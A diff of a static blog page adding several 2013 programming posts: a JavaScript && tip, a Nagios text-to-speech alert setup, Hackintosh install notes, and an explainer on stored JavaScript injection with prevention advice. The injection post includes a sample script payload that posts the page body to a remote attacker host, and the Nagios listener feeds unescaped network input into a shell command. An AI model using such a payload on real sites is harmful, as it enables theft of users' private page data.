@@ -63,7 +63,245 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-cool-audio-reminder-script-with-mac-os-xs-text-to-speech-feature" class="article article-type-post" itemscope="" itemprop="blogPost">
+    <article id="post-use-and-and-in-to-simplify-codes" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2013/07/20/use-and-and-in-to-simplify-codes/" class="article-date">
+  <time datetime="2013-07-20T06:46:00.000Z" itemprop="datePublished">2013-07-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/programming/">programming</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2013/07/20/use-and-and-in-to-simplify-codes/">Use &amp;&amp; to simplify js codes</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="The-technique-will-be-illustrated-by-the-following-simple-js-codes"><a href="#The-technique-will-be-illustrated-by-the-following-simple-js-codes" class="headerlink" title="The technique will be illustrated by the following simple js codes:"></a>The technique will be illustrated by the following simple js codes:</h2><figure class="highlight js"><figcaption><span>js-reg-and.js</span><a href="/downloads/code/js-reg-and.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s=<span class="string">'data0'</span>, m=<span class="regexp">/^([a-z]+)(\d+)$/</span>.exec(s);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the most common (and obvious) way to </span></span><br><span class="line"><span class="comment"> * check if there is match and the 2nd captured group's value is 0</span></span><br><span class="line"><span class="comment"> * would be</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(m) {</span><br><span class="line">	<span class="keyword">if</span>( m[<span class="number">2</span>] === <span class="string">'0'</span> ) {</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">'maybe'</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* but the above code can be simplified to */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m &amp;&amp; m[<span class="number">2</span>] === <span class="string">'0'</span>) {</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'maybe'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the technique can also be used in switch-case statement */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">switch</span>( m &amp;&amp; m[<span class="number">2</span>] ) {</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">'never'</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'0'</span>:</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">'maybe'</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">'run out of options'</span>)</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://midnightcodr.github.io/2013/07/20/use-and-and-in-to-simplify-codes/" data-id="cjwnz57pp000fli9wgshgsq0n" class="article-share-link">Share</a>
+      
+        <a href="http://midnightcodr.github.io/2013/07/20/use-and-and-in-to-simplify-codes/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-javascript-injection-attack-what-is-it-and-how-to-prevent" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2013/06/15/javascript-injection-attack-what-is-it-and-how-to-prevent/" class="article-date">
+  <time datetime="2013-06-16T00:46:00.000Z" itemprop="datePublished">2013-06-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/programming/">programming</a>►<a class="article-category-link" href="/categories/programming/security/">security</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2013/06/15/javascript-injection-attack-what-is-it-and-how-to-prevent/">Javascript injection attack - what is it and how to prevent</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Yes we’ve heard of the term “Javascript injection” from time to time but have you ever wonder how it actually works? In this post I will use a very simple example to demostrate how a potential attacker can take advantage of this kind of vulnerability.</p>
+<p>Let’s say we build a user forum which only registered user can view its content. One of the basic feature of a forum is to allow user to create new topics or reply to existing topics. In either case we need to create some html form to accept user inputs. We are very aware of MySQL injection so we use prepared statement to store topic content into the database. All is well but we</p>
+<ul>
+<li>forgot to sanitize the topic body (and/or other related fields such as subject) before storing to database</li>
+<li>render content from database as is without using proper escaping. So if an attacker enters the following content into the topic body:</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hello there.</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> _info=$(<span class="string">'body'</span>).html();</span></span><br><span class="line"><span class="javascript">	$.post(<span class="string">'http://some.remote.host/'</span>,&#123;<span class="attr">data</span>:_info&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>When the topic gets rendered in a normal user’s browser, user will see “Hello there” in the topic content. Under the hood the page’s html source code (which might contains some information only the user should  have access to) will be sent to a remote host that the attacker has access to without user’s awareness as the js code is not rendered (but it does get executed in user’s browser). If $(‘body’) contains too much info, the attacker can choose to steal information specific element (or elements).</p>
+<p>To prevent this kind of attack, we need to either:<br>Properly escape content from the server when rendering in the browser.<br>or<br>Strip tags such as <code>&lt;script&gt;</code>, or only allow tags such as p, br when storing user input into database.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://midnightcodr.github.io/2013/06/15/javascript-injection-attack-what-is-it-and-how-to-prevent/" data-id="cjwnz57po000dli9w1mbpp8za" class="article-share-link">Share</a>
+      
+        <a href="http://midnightcodr.github.io/2013/06/15/javascript-injection-attack-what-is-it-and-how-to-prevent/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-nagios-audio-alert-with-mac-os-x" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2013/05/09/nagios-audio-alert-with-mac-os-x/" class="article-date">
+  <time datetime="2013-05-10T00:50:00.000Z" itemprop="datePublished">2013-05-09</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/howto/">howto</a>►<a class="article-category-link" href="/categories/howto/fun/">fun</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2013/05/09/nagios-audio-alert-with-mac-os-x/">Nagios audio alert with Mac OS X</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>You have a nagios server running Linux and you have a nice OS at work called Mac OS X which comes with a handy text-to-speech feature. Wouldn’t it be nice if you can turn your workstation into a nagios audio alert system? In this post I’ll show you extactly how you can achieve that.</p>
+<h2 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h2><ul>
+<li>node.js installed on the client, along with a module called execSync (installed by command <code>npm install -g execSync</code>)</li>
+<li>nc (netcat) is installed on the nagios server (most distro comes with it so this shouldn’t be a problem)</li>
+</ul>
+<h2 id="Code-on-the-client"><a href="#Code-on-the-client" class="headerlink" title="Code on the client"></a>Code on the client</h2><figure class="highlight js"><figcaption><span>nagios-audio-alert.js</span><a href="/downloads/code/nagios-audio-alert.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* /usr/local/bin/nagios-audio-alert.js */</span></span><br><span class="line"><span class="keyword">var</span> dgram = <span class="built_in">require</span>(<span class="string">'dgram'</span>)</span><br><span class="line">    , server = dgram.createSocket(<span class="string">'udp4'</span>)</span><br><span class="line">    , exec=<span class="built_in">require</span>(<span class="string">'execSync'</span>).exec</span><br><span class="line">    , server_port=<span class="number">20123</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ts_log</span>(<span class="params">_msg</span>) </span>{</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'[%s] %s'</span>, <span class="keyword">new</span> <span class="built_in">Date</span>().toString(), _msg);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">msg, rinfo</span>) </span>{</span><br><span class="line">        <span class="keyword">var</span> pmsg=msg.toString().replace(<span class="regexp">/^\s+|\s+$/</span>, <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">if</span>(pmsg===<span class="string">'X'</span>) { <span class="keyword">return</span>; }</span><br><span class="line">        <span class="keyword">if</span>(pmsg!==<span class="string">''</span>) {</span><br><span class="line">            ts_log(<span class="string">"server got: "</span> + msg + <span class="string">" from "</span> + rinfo.address + <span class="string">":"</span> + rinfo.port);</span><br><span class="line">            <span class="keyword">var</span> arr=pmsg.split(<span class="regexp">/::/</span>);</span><br><span class="line">            <span class="keyword">if</span>(arr.length&gt;<span class="number">2</span>) {</span><br><span class="line">                <span class="keyword">var</span> msg_target=arr[<span class="number">0</span>], msg_state=arr[<span class="number">1</span>], msg_body=arr[<span class="number">2</span>];</span><br><span class="line">                <span class="keyword">if</span>(msg_state===<span class="string">'PROBLEM'</span>) {</span><br><span class="line">                    exec(<span class="string">'afplay /System/Library/Sounds/Glass.aiff'</span>)</span><br><span class="line">                    exec(<span class="string">'afplay /System/Library/Sounds/Glass.aiff'</span>)</span><br><span class="line">                    <span class="keyword">if</span>(msg_target===<span class="string">'host'</span>) {</span><br><span class="line">                        exec(<span class="string">'say "Attention Please, host '</span>+msg_body+<span class="string">' is having a problem."'</span>);</span><br><span class="line">                    } <span class="keyword">else</span> <span class="keyword">if</span> (msg_target===<span class="string">'service'</span>) {</span><br><span class="line">                        exec(<span class="string">'say "May I have your attention please, service problem: '</span>+msg_body+ <span class="string">'"'</span>);</span><br><span class="line">                    }</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    ts_log(<span class="string">'Received a message regarding nagios alert'</span>+msg_body);</span><br><span class="line">                }</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                ts_log(<span class="string">'Not a valid message ('</span>+pmsg+<span class="string">')'</span>);</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            ts_log(<span class="string">'Blank or space only message received.'</span>);</span><br><span class="line">        }</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">"listening"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{</span><br><span class="line">  <span class="keyword">var</span> address = server.address();</span><br><span class="line">  ts_log(<span class="string">"server listening "</span> + address.address + <span class="string">":"</span> + address.port);</span><br><span class="line">});</span><br><span class="line">server.bind(server_port);</span><br></pre></td></tr></table></figure>
+<p>Run the code from terminal:</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">node</span> <span class="title">/usr</span>/local/bin/nagios-audio-alert.js</span><br></pre></td></tr></table></figure>
+
+<h2 id="Do-some-test-runs-on-the-client"><a href="#Do-some-test-runs-on-the-client" class="headerlink" title="Do some test runs on the client"></a>Do some test runs on the client</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"service::PROBLEM::service down test"</span>|nc -u -w <span class="number">1</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">20123</span></span><br><span class="line">echo <span class="string">"host::PROBLEM::host test123 is down"</span>|nc -u -w <span class="number">1</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">20123</span></span><br></pre></td></tr></table></figure>
+
+<p>If everything goes well, ^C to exit the nagios-audio-alert.js program and move on to nagios server.</p>
+<h2 id="Modification-to-nagios-server’s-config-files"><a href="#Modification-to-nagios-server’s-config-files" class="headerlink" title="Modification to nagios server’s config files"></a>Modification to nagios server’s config files</h2><ul>
+<li>command.cfg</li>
+</ul>
+<figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">define</span> <span class="section">command</span>&#123;</span><br><span class="line">		command_name    notify-host-by-tts</span><br><span class="line">		command_line /usr/bin/printf <span class="string">"host::<span class="variable">$NOTIFICATIONTYPE</span><span class="variable">$::</span><span class="variable">$HOSTNAME</span>$ is <span class="variable">$HOSTSTATE</span>$"</span>|nc -u -v -w 1 &lt;replace_with_ip_of_mac_client&gt; 20123</span><br><span class="line">		&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>template.cfg</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">..</span>.</span><br><span class="line">define contact&#123;</span><br><span class="line">		name                            generic-contact         ; The name of this contact template</span><br><span class="line">		service_notification_period     24x7                    ;<span class="built_in"> service </span>notifications can be sent anytime</span><br><span class="line">		host_notification_period        24x7                    ; host notifications can be sent anytime</span><br><span class="line">		service_notification_options    u,c,r,f,s               ; send notifications <span class="keyword">for</span> all<span class="built_in"> service </span>states, flapping events, <span class="keyword">and</span> scheduled downtime events</span><br><span class="line">		host_notification_options       d,u,r,f,s               ; send notifications <span class="keyword">for</span> all host states, flapping events, <span class="keyword">and</span> scheduled downtime events</span><br><span class="line">		#service_notification_commands   notify-service-by-email        ; send<span class="built_in"> service </span>notifications via email</span><br><span class="line">		service_notification_commands   notify-service-by-tts,notify-service-by-email	; notify thru audio &amp; email</span><br><span class="line">		#host_notification_commands      notify-host-by-email   ; send host notifications via email</span><br><span class="line">		host_notification_commands      notify-host-by-tts,notify-host-by-email</span><br><span class="line">		register                        0                       ; DONT REGISTER THIS DEFINITION - ITS <span class="keyword">NOT</span> A REAL CONTACT, JUST A TEMPLATE!</span><br><span class="line">		&#125;</span><br><span class="line"><span class="built_in">..</span>.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Restart nagios server after making the above changes, always test nagios configuration before restarting: <code>/etc/init.d/nagios checkconfig</code></li>
+</ul>
+<h2 id="Run-nagios-audio-server-js-as-a-daemon"><a href="#Run-nagios-audio-server-js-as-a-daemon" class="headerlink" title="Run nagios-audio-server.js as a daemon"></a>Run nagios-audio-server.js as a daemon</h2><p>Rason for this is that we want the Mac to be able to play alerts even when the user is not logged in. Create <code>/System/Library/LaunchDaemons/nagios-audio-alert.plist</code> with the following content, change <code>CHANGE_TO_YOUR_USERNAME_ON_MAC</code> to your mac username</p>
+<figure class="highlight xml"><figcaption><span>nagios-audio-alert.plist.xml</span><a href="/downloads/code/nagios-audio-alert.plist.xml">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>nagios_alert<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>UserName<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CHANGE_TO_YOUR_USERNAME_ON_MAC<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/local/bin/node<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/local/bin/nagios.js<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>StandardOutPath<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/var/log/nagios_alert.log<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>KeepAlive<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>then</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl <span class="keyword">load</span> -w /<span class="keyword">System</span>/<span class="keyword">Library</span>/LaunchDaemons/nagios-audio-alert.plist</span><br></pre></td></tr></table></figure>
+
+<h2 id="Some-notes"><a href="#Some-notes" class="headerlink" title="Some notes"></a>Some notes</h2><ul>
+<li>20123 is the UDP port I grabbed from the air, change to whatever port you like (make sure they are in sync in both the js code and nagios config file command.cfg</li>
+<li>Reason why execSync is needed is because if you have two (or more) messages come in at the same time (or almost simultaneously), you want the messages to be played one after another</li>
+<li>If you have filewall on either the client or the nagios server, make sure they allow the traffic for the protocol/port used</li>
+<li>A mac client is not really a hard requirement to build a nagios audio alert system like this, a Linux box that is capable of doing text-to-audio can handle this kind of task with ease, some code in nagios-audio-alert.js need to be changed though</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://midnightcodr.github.io/2013/05/09/nagios-audio-alert-with-mac-os-x/" data-id="cjwnz57pm000ali9wcono45l5" class="article-share-link">Share</a>
+      
+        <a href="http://midnightcodr.github.io/2013/05/09/nagios-audio-alert-with-mac-os-x/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nagios/">nagios</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nodejs/">nodejs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2013/04/08/ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes/" class="article-date">
+  <time datetime="2013-04-09T00:02:00.000Z" itemprop="datePublished">2013-04-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/howto/">howto</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2013/04/08/ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes/">GA-Z68X-UD3H-B3 F12 Mountain Lion 10.8.3 Installation Notes</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Last Friday I had a hard time installing Moutain Lion 10.8.2 onto a GA-Z68X-UD3H-B3 (BIOS version F10), which was running fine with Lion (10.7.3), with either upgrade or clean install method. With some help from <a href="http://www.kakewalk.se/forums/discussion/4008/success-ga-z68x-ud3h-10-8-x-mountain-lion/p1" target="_blank" rel="noopener">http://www.kakewalk.se/forums/discussion/4008/success-ga-z68x-ud3h-10-8-x-mountain-lion/p1</a> and <a href="http://www.tonymacx86.com/" target="_blank" rel="noopener">http://www.tonymacx86.com/</a> I managed to install ML 10.8.3 onto the system. Here are the steps:</p>
+<ol>
+<li>Make a 10.8.3 Unibeast bootable usb drive (doesn’t need to check either options when making the drive with Unibeast) </li>
+<li>Upgrade BIOS to F12 (tried UEFI version but got BIOS ID check error hence I settled with F12)</li>
+<li>In BIOS setting, make sure HPET is set to 64bit. The system has an Agility 3 120GB SSD so the SATA3 port mode should be set to ACHI</li>
+<li>After installation, boot from Unibeast drive again but choose the OS on the SSD</li>
+<li>Download DDST (to the desktop), Multibeast from tonymacx86.com, choose the followings (More on the audio later)<img src="/images/z68x-ud3h-b3-f12-ML-10.8.3.png" class="center"></li>
+<li>After Multibeast and Lnx2Mac’s Realtek driver installations, shutdown, remove Unibeast drive and boot from SSD, network should be working but audio is not working (can see the sound icon, can adjust volume but there’s just no sound coming out)</li>
+<li>Download Audio_Network.zip from <a href="http://ge.tt/6nuMCAL/v/0?c" target="_blank" rel="noopener">http://ge.tt/6nuMCAL/v/0?c</a>, unzip but only place AppleHDA.kext onto the desktop</li>
+<li>Download KextBeast from tonymacx86.com and run it, it should pick up the AppleHDA.kext on the desktop</li>
+<li>Run Multibeast again, select nothing but Drivers &amp; Bootloaders-&gt;Drivers-&gt;Audio-&gt;Realtek ALC8xx-&gt;Without DSDT-&gt;ALC889 (basically the same option for audio in step 5)</li>
+<li>Reboot, audio problem should now be fixed (try different line out port if is sound still missing).</li>
+<li>(Optional) If you need to use iMessage, you need to install the newest Chimera (2.0.1 currently) from <a href="http://www.tonymacx86.com/downloads.php?do=file&id=164" target="_blank" rel="noopener">http://www.tonymacx86.com/downloads.php?do=file&amp;id=164</a></li>
+</ol>
+<h2 id="other-notes"><a href="#other-notes" class="headerlink" title="other notes"></a>other notes</h2><p>Trim doesn’t seem to be turned on when I checked the system info, need to spend some time to look into that.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://midnightcodr.github.io/2013/04/08/ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes/" data-id="cjwnz57pl0008li9wnticwiff" class="article-share-link">Share</a>
+      
+        <a href="http://midnightcodr.github.io/2013/04/08/ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tonymacx86/">tonymacx86</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-cool-audio-reminder-script-with-mac-os-xs-text-to-speech-feature" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2013/01/26/cool-audio-reminder-script-with-mac-os-xs-text-to-speech-feature/" class="article-date">
   <time datetime="2013-01-26T05:00:00.000Z" itemprop="datePublished">2013-01-26</time>
@@ -90,13 +328,23 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h2 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h2><p>We know that <a href="http://abcnews.go.com/WN/sitting-long-work-pose-health-danger/story?id=11926874" target="_blank" rel="noopener">sitting for too long is harmful for our health</a>. My solution to this problem is to set up a friendly reminder using Mac OS X’s speech to text feature, and a bit of programming. So here we go:</p>
-<h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p>1). Create a reminder file under your home directory, for example,<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi ~/break_reminder</span><br></pre></td></tr></table></figure></p>
+<h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p>1). Create a reminder file under your home directory, for example,</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi ~/break_reminder</span><br></pre></td></tr></table></figure>
+
+
 <figure class="highlight vbnet"><figcaption><span>content of ~/break_reminder</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Stand up <span class="keyword">and</span> walk around Your_Name.</span><br><span class="line">Don<span class="comment">'t be lazy Your_Name, I know you can do it.</span></span><br><span class="line">Stand up now, Your_Name, <span class="keyword">and</span> <span class="keyword">do</span> some exercises.</span><br><span class="line">Sitting <span class="keyword">for</span> too <span class="built_in">long</span> <span class="keyword">is</span> <span class="keyword">not</span> healthy <span class="keyword">for</span> you Your_Name.</span><br><span class="line"><span class="keyword">Take</span> a walk, <span class="keyword">get</span> some water Your_Name.</span><br><span class="line">You need a <span class="built_in">short</span> break Your_Name.</span><br><span class="line">Don<span class="comment">'t stick your butt to the chair for too long Your_Name.</span></span><br></pre></td></tr></table></figure>
+
 <p>Obviously change Your_Name to something that you want the voice to call you. This is one that I created, feel free to change the content.</p>
-<p>2). Create the reminder shell script<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">vi</span> ~/reminder.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure></p>
+<p>2). Create the reminder shell script</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">vi</span> ~/reminder.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">(( total_lines = $(wc -l &lt; ~/break_reminder) )) &amp;&amp; (( line = <span class="variable">$RANDOM</span> % <span class="variable">$total_lines</span> + 1 )) &amp;&amp; sed -n <span class="variable">$&#123;line&#125;</span>p ~/break_reminder|say</span><br></pre></td></tr></table></figure>
